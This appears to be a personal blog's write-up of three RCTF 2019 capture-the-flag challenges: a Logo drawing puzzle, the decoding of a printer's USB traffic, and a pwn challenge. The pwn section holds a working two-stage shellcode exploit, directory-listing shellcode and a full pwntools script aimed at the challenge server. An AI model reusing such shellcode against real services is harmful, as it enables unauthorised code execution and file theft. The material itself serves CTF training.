---
title: "RCTF 2019 Writeup"
date: 2019-05-19T21:29:39+08:00
draft: false
tags: [
  "ctf",
  "cyber-security",
  "write-up",
  "shellcoding",
  "pwn"
]
description: My solves for RCTF 2019 challenges
---

# draw - misc

## Problem

I'm god's child.

Flag format: `RCTF_[A-Za-z]`

cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home

## Solution

I recognized that the code in the description is written in [logo](https://en.wikipedia.org/wiki/Logo_(programming_language)), one of the first few programming languages that I learned.

After that, I just found a [logo interpreter](https://www.calormen.com/jslogo/) online and got the flag:

{{< figure src="/blog/2019-05-19-rctf-writeup/logo.png" >}}

flag: `RCTF_HeyLogo`

# printer - misc

## Problem

The supermarket bought a new printer last night. I hacked into their computer and captured the USB traffic on it. Could you help me steal the secret?

Flag format: flag{0-9a-z_} (Convert uppercase to lowercase)

Attachments: [file](/blog/2019-05-19-rctf-writeup/printer.zip)

## Solution

For this challenge, we are given a pcapng that contains USB protocol packets.

Most of the packets are input packets labeled as `URB_INTERRUPT in` by wireshark. There are, however, a few exceptions:


<div style="display: flex; width: 100%; justify-content: center;">
<figure>
<img src="/blog/2019-05-19-rctf-writeup/wireshark.png" style="max-width: 90vw; width: 90vw;"/>
</figure>
</div>

This packet and the one below it caught my attention because they are both output packets and contains ascii characters that resemble some sort of programming language.

I copied one of the lines and did a quick google search. [This](http://www.cleversoft.com.ar/descargas/utilidades/Impresoras/Tsc/TSPL_TSPL2_Programming2.pdf) is what I found - a TSPL/TSPL2 Programming Language manual. Just like how 3d printers are controlled using G-code, it seems like that printers also have their own programming language.

Here are the commands within the two packets:

```
// packet 1

SIZE 47.5 mm, 80.1 mm
GAP 3 mm, 0 mm
DIRECTION 0,0
REFERENCE 0,0
OFFSET 0 mm
SET PEEL OFF
SET CUTTER OFF
SET PARTIAL_CUTTER OFF

// packet 2

SET TEAR ON
CLS
BITMAP 138,75,26,48,1,BINARY_DATA
BITMAP 130,579,29,32,1,BINARY_DATA
BAR 348, 439, 2, 96
BAR 292, 535, 56, 2
BAR 300, 495, 48, 2
BAR 260, 447, 2, 88
BAR 204, 447, 56, 2
BAR 176, 447, 2, 96
BAR 116, 455, 2, 82
BAR 120, 479, 56, 2
BAR 44, 535, 48, 2
BAR 92, 455, 2, 80
BAR 20, 455, 72, 2
BAR 21, 455, 2, 40
BAR 21, 495, 24, 2
BAR 45, 479, 2, 16
BAR 36, 479, 16, 2
BAR 284, 391, 40, 2
BAR 324, 343, 2, 48
BAR 324, 287, 2, 32
BAR 276, 287, 48, 2
BAR 52, 311, 48, 2
BAR 284, 239, 48, 2
BAR 308, 183, 2, 56
BAR 148, 239, 48, 2
BAR 196, 191, 2, 48
BAR 148, 191, 48, 2
BAR 68, 191, 48, 2
BAR 76, 151, 40, 2
BAR 76, 119, 2, 32
BAR 76, 55, 2, 32
BAR 76, 55, 48, 2
BAR 112, 535, 64, 2
BAR 320, 343, 16, 2
BAR 320, 319, 16, 2
BAR 336, 319, 2, 24
BAR 56, 120, 24, 2
BAR 56, 87, 24, 2
BAR 56, 88, 2, 32
BAR 224, 247, 32, 2
BAR 256, 215, 2, 32
BAR 224, 215, 32, 2
BAR 224, 184, 2, 32
BAR 224, 191, 32, 2
BAR 272, 311, 2, 56
BAR 216, 367, 56, 2
BAR 216, 319, 2, 48
BAR 240, 318, 2, 49
BAR 184, 351, 2, 16
BAR 168, 351, 16, 2
BAR 168, 311, 2, 40
BAR 152, 351, 16, 2
BAR 152, 351, 2, 16
PRINT 1,1
```

The second packet seems to be the one that actually draws out the flag using two different commands: `BITMAP` and `BAR`. Now, I just have to implement the two commands in python and get the flag.

Here is the code for that:

```python
from PIL import Image
from pwn import *

img = Image.new( '1', (1000,1000),color=1)
pixels = img.load()

data1 = 'FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF 00FFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFC3FF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF E7FFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFE7FF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF E7FFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFE7FF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF E7FFE3FF FE1FFFFF FFFFF807 C03C603F C07C07E0 007F7FF0 1F8067FF 007FF803 FC07C03F FF1FF1F0 4F8FF1FF 1FFF1FFF 3FFCFF1F 27FC7F1F F3E1FF1F F9FFFF1F F1FC1FCF F8FF1FFF 1FFF3FFE FE3F87F8 FF9FEFF8 FF1FF9FF FF8FF1FC 3FC7FCFF 1FFF1FFF 1FFEFC7F C7F9FF8F DFFC7F1F F9FFFF8F F1FC7FE3 FC7F1FFF 1FFF1FFE FCFFE7F1 FF8F9FFC 3F1FF9FF FFC7F1FC 7FE3FE3F 1FFF1FFF 0FFEF8FF E7F1FF0F BFFE3F1F F9FFFFC7 F1FC7FE3 FE3F1FFF 1FFF0FFE F8FFE7E1 FF8F3FFE 3F1FF9FF FFE3F1FC 7FE3FF1F 1FFF1FFF 47FEF8FF E7E3FF9F 7FFE1F1F F9FFFFE3 F1FC7FF3 FF8E1FFF 1FFF47FE F9FFE7E3 FFFFFFFF 1F1FF9FF FFF1F1FC 7FF3FF8C 1FFF1FFF 63FEF9FF E7F1FFFF FFFF1F1F F9FFFFF1 F1FC7FF3 FFC11FFF 1FFF63FE F9FFE7F1 FFFFFFFF 1F1FF9FF FFF1F1FC 7FE3FFE3 1FFF1FFF 71FEF9FF E7F1FFFF FFFF1F1F F9FFFFF8 F1FC7FE3 FFE71FFF 1FFF71FE F8FFE7F8 FFFFFFFF 0F1FF9FF FFF8F1FC 7FE3FFCF 1FFF1FFF 78FEF8FF E7FCFFFF FFFF0F1F F9FFFFFC 61FC7FE7 FF9F1FFF 1FFF78FE F8FFC7FE 3FFFFFFF 0F1FF9FF FFFC41FC 7FC7FF3F 1FFF1FFF 7C7EFCFF C7FF83FF FFFF0F9F F1FFFFFE 11FC3F8F FF7F1FFF 1FFF7C7E FC7FA7FF 87FFFFFF 0F9FE9FF FFFE31FC 1F1FFE7F 1FFF1FFF 7E3EFE3E 67FE3FFF FFFF1F8F 99FFFFFF 31FC403F E01F1FFF 1FFF7E3E FF80E0FC 7FFFFFFF 1FC039FF FFFE71FC 79FFFFFF 1FFF1FFF 7F1EFFF3 EFF8FFFF FFFF1FF0 F9FFFFFE F1FC7FFF FFFF1FFF 1FFF7F0E FFFFFFF8 FFFFFFFF 1FFFF9FF FFFCF1FC 7FFFFFFF 1FFF1FFF 7F8EFFFF FFF8FFFF FFFE1FFF F9FFFFF9 F1FC7FFF FFFF1FFF 1FFF7F86 FFFFFFF8 FF9F7FFE 3FFFF9FF FFFBF1FC 7FFFFFFF 1FFF1FFF 7FC6FFFF FFF8FF0F 3FFE3FFF F9FFFFF7 F1FC7FFF FFFF1FFF 1FFF7FC2 FFFFFFF8 FF8FBFFC 7FFFF9FF FFE7F1FC 7FFFFFFF 1FFF1FFF 7FE2FFFF FFF8FF8F 9FFC7FFF F9FFFFCF F1FC7FFF FFFF1FFF 1FFF7FF0 FFFFFFFC FF9F9FF8 FFFFF9FF FF8FF1FC 7FFFFFFF 1FFF1FFF 7FF0FFFF FFFC7F9F 8FF1FFFF F9FFFF0F F0FC3FFF FFFF1FFF 0FFE7FF8 FFFFFFFE 1E7F83E3 FFFFF8FF FC03C03C 0FFFFFFF 03E00078 0FF83FFF FFFF80FF F80FFFFF F83FFFFF FFFDFFFF FFFF3FFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFBFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF'
data1 = bits(int(data1.replace(' ', '').strip(), 16))

data2 = 'FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF C7FFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FE38FFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFDFF7F FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFF9FF 3FFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFF9 FF3FFFFF FFFFFFFF 9FFEFBFF C7FFFFFF E1FFF8FF FFFFFC3F FFFFFFFF F9FF3FF8 FFFFFFFF FF0FFEFB FF39FF00 7F9C7FE7 2FFFFFF3 C3FC07FF FFF87E78 463F803F F01F0FFE 7BFEFEFF F7FF3F3F 9F8FFFFF EFF3FFBF FFFFFC01 FA3F9FFB FFFE7F9F FE71FCFE 7FF7FF7F 9F9FCFFF FFEFFBFF BFFFFFFF C07E7F9F FBFFFE7F FFFC71F9 FF3FF7FE FF9F3FCF FFFFEFFB FFBFFFFF FFFE7E7F 8FFBFFFE 7FFFFD75 F9FF3FF7 FFFFCF3F CFFFFFE7 FFFFBFFF FFFFFE7E 7F9FFBFF FE7FFFFD 35F9FF3F F7FFFFCF 3FCFFFFF E3FFFFBF FFFFFF80 FE7F9FFB FFFE7FFF FD2CF9FF 3FF7FFFF CF3FCFFF FFF07FFF BFFFFFFF 7CFE7F3F FBFFFE7F FFFB2CF9 FF3FF7FE 000F3FCF FFFFFC1F FFBFFFFF FE7E7E7C 7FFBFFFE 7FFFFBAC F9FF3FF7 FE7FCF3F CFFFFFFF 87FFBFFF FFFE7E7E 03FFFBFF FE7FFFFB 9EF9FF3F F7FE7FCF 3FCFFFFF FFE7FFBF FFFFFEFE 7E7FFFFB FFFE7FFF FB9E79FF 3FF7FE7F 9F3FCFFF FFEFF3FF BFFFFFFE FE7E7F9F FBFFFE7F FFF79E7C FE7FF7FF 3F9F9F8F FFFFEFF3 FFBFFFFF FE7E7F7F 1FFBFFFE 7F1FF79E 7EFCFFF7 FF3F3F9F 0FFFFFE7 F7FFBFFF FFF27EFF 3F3FFBFF FE7F0FE3 8E3F39FF F7FFCE7F C04FFFFF E1CFFF9F FFFFF019 FF9E7FFB FFFE7F1F FFFFFFC7 FFF7FFF1 FFFBCFFF FFEE3FFF 87FFFFFB E7FFE1FF FBFFE00F FFFFFFFF FFFFF7FF FFFFFFCF FFFFFFFF FFFFFFFF FFFFFFFF FFFBFFFE 7FFFFFFF FFFFFFF7 FFFFFFFF CFFFFFFF FFFFFFFF FFFFFFFF FFFFFBFF FE7FFFFF FFFFFFFF F7FFFFFF FFCFFFFF FFFFFFFF FFFFFFFF FFFFFFFB FFFE7FFF FFFFFFFF FFF7FFFF FFFFCFFF FFFFFFFF FFFFFFFF FFFFFFFF FBFE7E7F FFFFFFFF FFFFF7FF FFFFFFCF FFFFFFFF FF3FFFFF FFFFFFFF FFFBFE7E FFFFFFFF FFFFFFF7 FFFFFFFF CFFFFFFF FFFF1FFF FFFFFFFF FFFFFBFE 7CFFFFFF FFFFFFFF F03FFFFF FFC3FFFF FFFFFF1F FFFFFFFF FFFFFFF8 1F03FFFF FFFFFFFF FFF3FFFF FFFFCFFF FFFFFFFF BFFFFFFF FFFFFFFF F9FFFFFF'
data2 = bits(int(data2.replace(' ', '').strip(), 16))

cmds = '''
BAR 348, 439, 2, 96
BAR 292, 535, 56, 2
BAR 300, 495, 48, 2
BAR 260, 447, 2, 88
BAR 204, 447, 56, 2
BAR 176, 447, 2, 96
BAR 116, 455, 2, 82
BAR 120, 479, 56, 2
BAR 44, 535, 48, 2
BAR 92, 455, 2, 80
BAR 20, 455, 72, 2
BAR 21, 455, 2, 40
BAR 21, 495, 24, 2
BAR 45, 479, 2, 16
BAR 36, 479, 16, 2
BAR 284, 391, 40, 2
BAR 324, 343, 2, 48
BAR 324, 287, 2, 32
BAR 276, 287, 48, 2
BAR 52, 311, 48, 2
BAR 284, 239, 48, 2
BAR 308, 183, 2, 56
BAR 148, 239, 48, 2
BAR 196, 191, 2, 48
BAR 148, 191, 48, 2
BAR 68, 191, 48, 2
BAR 76, 151, 40, 2
BAR 76, 119, 2, 32
BAR 76, 55, 2, 32
BAR 76, 55, 48, 2
BAR 112, 535, 64, 2
BAR 320, 343, 16, 2
BAR 320, 319, 16, 2
BAR 336, 319, 2, 24
BAR 56, 120, 24, 2
BAR 56, 87, 24, 2
BAR 56, 88, 2, 32
BAR 224, 247, 32, 2
BAR 256, 215, 2, 32
BAR 224, 215, 32, 2
BAR 224, 184, 2, 32
BAR 224, 191, 32, 2
BAR 272, 311, 2, 56
BAR 216, 367, 56, 2
BAR 216, 319, 2, 48
BAR 240, 318, 2, 49
BAR 184, 351, 2, 16
BAR 168, 351, 16, 2
BAR 168, 311, 2, 40
BAR 152, 351, 16, 2
BAR 152, 351, 2, 16
'''
cmds = cmds.strip().split('\n')


def draw_bitmap(pixels, x, y, width, height, data):
  width *= 8
  for w in range(width):
    for h in range(height):
      rw = w + x
      rh = h + y
      pixels[rw, rh] = data1[w+h*width]

def draw_bar(pixels, x, y, width, height):
  for w in range(width):
    for h in range(height):
      rw = w + x
      rh = h + y
      pixels[rw, rh] = 0


draw_bitmap(pixels, 138, 75, 26, 48, data1)
draw_bitmap(pixels, 130,579,29,32, data2)

for each in cmds:
  params = each.replace('BAR ','').split(', ')
  params = map(int, params)
  x, y, width, height = params
  draw_bar(pixels, x, y, width, height)

img.save('test.png')
```

In the end, we get an image with the flag:

{{< figure src="/blog/2019-05-19-rctf-writeup/printer_flag.png" >}}

flag: `flag{my_tsc_hc3pnikdk}`

# shellcoder - pwn

## Problem

who likes singing, dancing, rapping and shell-coding?

The directories on the server looks something like this:

```
...
├── flag
│   ├── unknown
│   │   └── ...
│   │       └── flag
│   └── unknown
└── shellcoder
```

nc 139.180.215.222 20002

nc 106.52.252.82 20002

Attachments: [file](/blog/2019-05-19-rctf-writeup/shellcoder.zip)

## Solution

After a quick analysis of the binary given, we see that the binary reads in 7 bytes of data, zero out most of the registers, and executes the data as shellcode.

7-byte is not a lot. The `syscall` instruction itself takes up 2 bytes. Due to this size limitation, I decided to go with a two-stage approach. First, I will craft a 7-byte payload that will make a read syscall and read in a second stage payload. Second, I will craft a second stage payload that is more than 7 bytes and perform whatever task I want without worrying about any size limitations.

### Crafting the stage 1 payload

I ran the binary in gdb just to see the state of the registers when our shellcode is being called. This is helpful as it allows us to utilize some of the existing register values:

```
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x0
$rdx   : 0x0
$rsp   : 0x00007fffffffdc98  →  0xabadc0defee1dead
$rbp   : 0x0
$rsi   : 0x0
$rdi   : 0x00007ffff7ff4000  →  0xf4f4f4f4f4f40a61
$rip   : 0x00007ffff7ff4000  →  0xf4f4f4f4f4f40a61
$r8    : 0x0
$r9    : 0x0
$r10   : 0x0
$r11   : 0x0
$r12   : 0x0
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
```

As you can see, there's not a lot to work with, but we do have the address of the current buffer loaded in rdi.

In order to make the read syscall, we need four things:

* rdi == 0 (stdin)
* rsi == the address of the current buffer
* rdx == a reasonably large number (count)
* make the syscall

We know that the syscall itself takes up 2 bytes and copying the address of the current buffer from rdi to rsi takes at least 2 bytes. This leaves us 3 bytes to zero out rdi and make rdx a large number:

```
; copy the address of the current buffer from rdi to rsi (2 bytes)
push rdi
pop rsi

; 3 bytes left

; syscall (2 bytes)
syscall
```

My first idea was to move the address of the current buffer to rdx as it is quite a large number; however, it turns out to be too large and would not work.

Looking for inspiration, I came across [Single Byte or Small x86 Opcodes](http://xxeo.com/single-byte-or-small-x86-opcodes). Although it is written for 32 bit instead of 64 bit, it is still quite useful and helped me came up with my final payload:

```
; copy the address of the current buffer from rdi to rsi (2 bytes)
push rdi
pop rsi

; zero out rdi and store the lower 4 bytes in eax (1 bytes)
xchg edi,eax

; load the lower 4 bytes to edx (1 byte)
xchg edx, eax

; syscall (2 bytes)
syscall
```

This payload only uses 6 bytes of space! It relayed on the fact that `xchg XXX, eax` is a single byte instruction, and due to its 32 bit nature, the current address is truncated to only 4 bytes before being loaded into rdx.

### Crafting the stage 2 payload

Now, we successfully bypassed the size limitation and can run whatever code we want; however, the execve syscall seems to be blocked on the server. Bummer!

But we can still do an open/read/write to get the flag right? Well, now is a good time to review the challenge description:

> The directories on the server looks something like this:

```
...
├── flag
│   ├── unknown
│   │   └── ...
│   │       └── flag
│   └── unknown
└── shellcoder
```

As you can see, the flag is hidden in a nested folder, and we need a way to find the path for the flag file.

Basically, we need a way to list the content in a given directory. The first thing that came to me was the `ls` command, so I ran a strace on it:

```
$ strace ls
...
openat(AT_FDCWD, ".", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3
...
getdents(3, /* 8 entries */, 32768)     = 272
getdents(3, /* 0 entries */, 32768)     = 0
...
```

All that we need is two syscalls: [openat](https://linux.die.net/man/2/openat) which opens a file descriptor for a given path and [getdents](http://man7.org/linux/man-pages/man2/getdents.2.html) which list out the content of a directory.

With the help of the shellcraft module in pwntools, I quickly created a payload that can read out the content of a given directory:

```python
payload = 'start:'
payload += shellcraft.amd64.linux.syscall(0x00, 0, 'rsp', 100)
payload += shellcraft.amd64.linux.syscall(0x101, -100, 'rsp', 591872)
payload += shellcraft.amd64.linux.syscall(0x4e, 'rax', 'rsp', 32768)
payload += shellcraft.amd64.linux.syscall(0x01, 1, 'rsp', 'rax')
payload += 'jmp start'
payload = asm(payload)
```

Another minor inconvenience is the fact that the `getdents` syscall returns a linux_dirent struct for each file which needs to be parsed. Lucky, we can do that on the client side with python instead of parsing it with assembly:

```python
def parse(data):
  files = []
  i = 0
  while i < len(data):
    i += 8
    i += 8
    l = u64(data[i:i+2].ljust(8,'\x00')) - 18
    i += 2

    files.append(data[i:i+l].split('\x00')[0])
    i += l
  return files
```

Now, with the ability to list all files in a given directory, we just need a program to recursively go through all the folders and find the flag file. 

Because the server always timeouts before the flag file can be found, I also added the functionality to preserve progress so that I can get the path using multiple sessions.

Here is the final code:

```python
import json
from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './shellcoder'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)

if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  REMOTE = False
else:
  sh = remote('139.180.215.222', 20002)
  REMOTE = True
payload = "\x57\x5e\x97\x92\x0f\x05\x00"

sh.sendafter(':', payload)

payload = 'start:'
payload += shellcraft.amd64.linux.syscall(0x00, 0, 'rsp', 100)
payload += shellcraft.amd64.linux.syscall(0x101, -100, 'rsp', 591872)
payload += shellcraft.amd64.linux.syscall(0x4e, 'rax', 'rsp', 32768)
payload += shellcraft.amd64.linux.syscall(0x01, 1, 'rsp', 'rax')
payload += 'jmp start'
payload = asm(payload)
stage2 = payload

def run(path):
  sh.send(path.ljust(100,'\x00'))
  return sh.recv(timeout=1)

def parse(data):
  files = []
  i = 0
  while i < len(data):
    i += 8
    i += 8
    l = u64(data[i:i+2].ljust(8,'\x00')) - 18
    i += 2

    files.append(data[i:i+l].split('\x00')[0])
    i += l
  return files

with open('./files') as f:
  all_files = json.loads(f.read())  
try:
  while len(all_files) > 0:
    file = all_files.pop(0)
    new_files = parse(run(file))
    new_files = filter(lambda x: x != '.' and x != '..', new_files)
    print new_files
    for each in new_files:
      if 'flag' in each:
        print 'FOUND IT'
        print file+'/'+each
        print 'hello'
        exit(0)
    new_files = map(lambda x: file+'/'+x, new_files)
    
    all_files.extend(new_files)
    print file
except:
  print all_files
  with open('./files', 'w') as f:
    f.write(json.dumps(all_files))

print 'job done, nothing found'
```

With this code, I found the flag file located at `./flag/rrfh/lmc5/nswv/1rdr/zkz1/pim9/flag'`.

Now with a simple payload, we can read out the flag:

```python
sh.sendline('\x90'*10+asm(shellcraft.amd64.linux.cat('./flag/rrfh/lmc5/nswv/1rdr/zkz1/pim9/flag')))
sh.interactive()
```

flag: `rctf{1h48iegin3egh8dc5ihu}`